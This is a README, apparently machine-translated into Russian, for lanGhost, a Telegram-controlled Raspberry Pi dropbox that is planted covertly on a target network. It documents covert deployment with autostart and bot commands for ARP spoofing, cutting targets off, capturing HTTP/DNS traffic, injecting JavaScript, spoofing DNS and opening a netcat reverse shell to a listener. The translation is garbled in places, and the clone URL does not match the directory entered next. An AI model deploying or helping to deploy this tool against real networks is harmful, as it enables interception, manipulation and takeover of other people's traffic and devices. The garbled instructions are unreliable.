<p align=center>
<a href="https://github.com/xdavidhu/lanGhost/blob/master/README.MD"><img src="https://github.com/xdavidhu/lanGhost/raw/master/img/lanGhost.png"/>
</a>
<a href="https://travis-ci.org/xdavidhu/lanGhost">
    <img src="https://travis-ci.org/xdavidhu/lanGhost.svg?branch=master" align=center/>
</a>
<a href="https://github.com/xdavidhu/lanGhost">
    <img src="https://img.shields.io/badge/python-3.3%2C%203.4%2C%203.5%2C%203.6-brightgreen.svg" align=center/>
</a>
<a href="https://github.com/xdavidhu/lanGhost/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/license-MIT-blue.svg" align=center/>
</a>
<a href="https://github.com/xdavidhu/lanGhost">
    <img src="https://img.shields.io/github/stars/xdavidhu/lanGhost.svg" align=center/>
</a>
</p>

<h3 align=center>⚠️ Предупреждение! Этот проект больше не поддерживается и может не работать как исключение.</h3>

<h3 align=center><i>Чат-бот Dropbox в локальной сети, управляемый через Telegram</i></h3>

<h1 align=center>функции:</h1>
<p align=center>
<a href="https://github.com/xdavidhu/lanGhost/blob/master/README.MD"><img src="https://raw.githubusercontent.com/xdavidhu/lanGhost/master/img/features.png"/></a>
</p>

<br><br>

<p align=center>
<a href="https://github.com/xdavidhu/lanGhost/blob/master/DEMOS.MD"><img src="img/demos-button.png" align=center width=40%/></a>
<br><br><br>
</p>

<h1 align=center>установка:</h1>

<h3 align=center>предупреждение:</h3>

<p align=center>lanGhost разработан для <b> Raspberry Pis </b> (<b> Raspbian </b> / <b> Kali для RPi </b>). Запуск его на других / настольных дистрибутивах может вызвать проблемы и может не работать как исключение.</p>

Вам понадобится ** Raspberry Pi ** с ** свежим Raspbian / Kali ** на SD-карте, потому что вы не хотите, чтобы что-либо еще работало в фоновом режиме.

Загрузите Pi, получите SSH-продажу или подключите монитор и клавиатуру и введите следующие команды:

```
$ sudo apt update && sudo apt install python3 python3-pip
$ git clone https://github.com/Durka22/lanGhost-termux.git
$ cd lanGhost
$ bash setup.py
```

Пожалуйста, ** прочтите ** вопросы / сообщения при запуске сценария установки!
<h4>шаг 1/4 - setup.py</h4>

```
[+] Введите имя подключенного сетевого интерфейса / будет
быть подключенным к целевой LAN. Проводной интерфейс по умолчанию - eth0,
а беспроводной интерфейс по умолчанию - wlan0 в большинстве систем, но
вы можете проверить это в другом терминале с помощью команды ifconfig.
```

<h4>шаг 2/4 - setup.py</h4>

```
[+] Создайте ключ API Telegram, отправив сообщение @BotFather в Telegram
с командой '/newbot'.

После этого @BotFather попросит вас выбрать имя для вашего бота.
Это может быть что угодно.

Наконец, @BotFather попросит вас указать имя пользователя для вашего бота. У тебя есть
чтобы выбрать здесь уникальное имя пользователя, которое заканчивается на «бот». За
пример: xdavidbot. Запишите это имя пользователя, так как позже
вам нужно будет искать это, чтобы найти своего бота, который lanGhost
будет работать дальше.

После того, как вы отправите свое имя пользователя на @BotFather, вы получите
ваш ключ API.
```

<p align=center>
<img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-1.png"/>
<br><br>
<img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-2.png"/>
</p>

<h4>шаг 3/4 - setup.py</h4>

```
[+] Теперь, чтобы lanGhost разрешал доступ только вам, вам нужно подтвердить себя.

Отправьте проверочный код, указанный ниже, ТОЧНОМУ, который вы только что создали. Просто найдите свой
@username бота (то, что вы отправили @BotFather), чтобы найти его.

[+] Код подтверждения для отправки: ******
```

<p align=center>
<img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-3.png"/>
</p>

<h4>шаг 4/4 - setup.py</h4>

```
[+] Вы хотите, чтобы lanGhost запускался при загрузке? Эта опция необходима, если вы используете
это устройство как Dropbox, потому что, когда вы собираетесь бросить это устройство в
сети, у вас не будет возможности запустить lanGhost удаленно! (автозапуск работает
добавив новую запись cron '@reboot')
```

<h3 align=center>Если вы готовы с настройкой, просто перезагрузите Pi, и lanGhost запустится!</3>
<br><br>
<p align=center>
<img src="https://github.com/xdavidhu/lanGhost/raw/master/img/screenshot-telegram-4.png"/>
</p>

<h1 align=center>Применение:</h1>

<h3 align=center>предупреждения:</h3>

<p align=center>Использование lanGhost в сетях больше / 24 <b> не рекомендуется </b>, так как сканирование займет слишком много времени..</p>

<p align=center>lanGhost <b> не тихий </b>. Любой, кто отслеживает трафик, может видеть пакеты ARP.!</p>

<h3>брось это в сеть:</h3>

Если вы выбрали «да» на «шаге 4/4 (автозапуск)», Pi полностью настроен для сброса. lanGhost должен запуститься при загрузке и отправить вам сообщение в Telegram с текстом: `lanGhost start! 👻`.

Обязательно сначала опробуйте его в своей лаборатории и проверьте, отвечает ли lanGhost на ваши сообщения!

Если у вас все настроено, просто подключите его к целевой сети, подключив кабель Ethernet к Pi и подключив питание через микро-USB, и вы готовы к работе!

(lanGhost также может работать через Wi-Fi, но сначала вам нужно настроить wpa_supplicant для автоматического подключения к сети)

<h3>доступные команды:</h3>

```
/ scan - сканировать локальную сеть
/ scanip [TARGET-IP] - сканировать определенный IP-адрес.
/ kill [TARGET-IP] - Остановить сетевое соединение цели.
/ mitm [TARGET-IP] - Захват HTTP / DNS-трафика от цели.
/ replaceimg [TARGET-IP] - Заменить HTTP-образы, запрошенные целью.
/ injectjs [TARGET-IP] [JS-FILE-URL] -Внедрить JavaScript в HTTP-страницы, запрошенные целью.
/ spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Подмена DNS-записей для цели.
/ attack - Просмотр текущих атак.
/ stop [ATTACK-ID] - Остановить текущую атаку.
/ restart - перезапустить lanGhost.
/ reversesh [TARGET-IP] [PORT] - Создать обратную оболочку netcat для цели.
/ help - Показать меню справки.
/ping - Pong.
```

<h3>система атаки:</h3>

Вы можете начать атаку с помощью одной из этих команд: `/ kill, / mitm, / replaceimg, / injectjs, / spoofdns`
Взаимодействие с другими людьми
Если у вас запущена одна или несколько атак, вы можете использовать команду `/ attack`, чтобы получить их список, содержащий идентификаторы ATTACK-ID.
Взаимодействие с другими людьми
Чтобы остановить атаку, введите `/ stop [ATTACK-ID]`.

<h3>обратная оболочка:</h3>

<h3 align=center>предупреждение:</h3>

<p align=center><code>/reversesh</code> устанавливает только TCP-соединение netcat, которое не зашифровано, и весь трафик можно контролировать! Используйте его только для аварийных исправлений или для настройки зашифрованного обратного соединения при необходимости.</p>
Команда `/ reversesh` предназначена для получения обратной оболочки на Pi, когда она недоступна извне.
Взаимодействие с другими людьми
Чтобы использовать команду `/ reversesh`, вам нужно, чтобы сервер слушал оболочку.
Взаимодействие с другими людьми
Команда Netcat для запуска слушателя на вашем сервер

```
$ nc -l 0.0.0.0 [PORT]
```

Команда Telegram:

```
/reversesh [IP-of-your-listening-server] [PORT]
```

<h3>нападения:</h3>

 * `/ kill` - останавливает подключение к Интернету для цели.
 * `/ mitm` - захватывает HTTP- и DNS-трафик от цели и отправляет его в текстовых сообщениях.
 * `/ replaceimg` - Заменяет HTTP-изображения для цели на то, что вы отправляете боту.
 * `/ injectjs` - внедряет JavaScript в каждый ответ HTTP HTML для цели.
 Вам необходимо разместить JS-файл на своем сервере и указать URL-адрес в качестве параметра.
 * `/ spoofdns` - Имитирует ответы DNS для цели.

Все атаки используют ** ARP Spoofing **!

<h3>сканированиеs:</h3>

 * `/ scan` - Сканирует локальную сеть и возвращает хосты в оперативный режим. Использует nmap -sn scan для обнаружения хостов.
 * `/ scanip` - Сканирует IP-адрес на предмет открытых портов и другой информации. Использует сканирование nmap -sS.

<h3>уведомления:</h3>

Вы будете получать сообщение каждый раз, когда новое устройство подключается / покидает сеть.

<h1 align=center>отказ от ответственности:</h1>

<h3 align=center>Я не несу ответственности ни за что, что вы делаете с этой программой, поэтому, пожалуйста, используйте ее только в хороших и образовательных целях.</h3>

<h1 align=center>законный:</h1>

<p align=center>
Авторские права (c) 2018 Дэвид Шютц. Некоторые права защищены. <br> <br>
lanGhost находится в соответствии с условиями лицензии MIT с учетом всех пояснений, содержащихся в файле лицензии. Вы также можете написать мне по адресу xdavid {at} protonmail {dot} com.
</p>
